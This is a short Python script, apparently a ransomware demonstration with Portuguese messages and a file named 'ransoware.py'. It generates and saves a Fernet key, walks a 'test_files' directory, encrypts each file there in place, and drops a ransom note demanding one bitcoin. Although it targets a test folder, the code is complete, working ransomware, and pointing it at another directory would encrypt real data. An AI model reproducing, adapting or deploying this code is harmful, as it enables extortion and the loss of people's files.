from cryptography.fernet import Fernet
import os

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

def carregar_chave():
    if not os.path.exists("chave.key"):
        raise FileNotFoundError("Arquivo de chave não encontrado. Gere uma chave primeiro.")
    return open("chave.key", "rb").read()

def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

def criar_mensagem_resgate():
    with open("LEIA_ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados.\n")
        f.write("Envie 1 bitcoin para o endereço X e envie o comprovante.\n")

def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Script executado! Arquivos criptografados.")

if __name__ == "__main__":
    main()
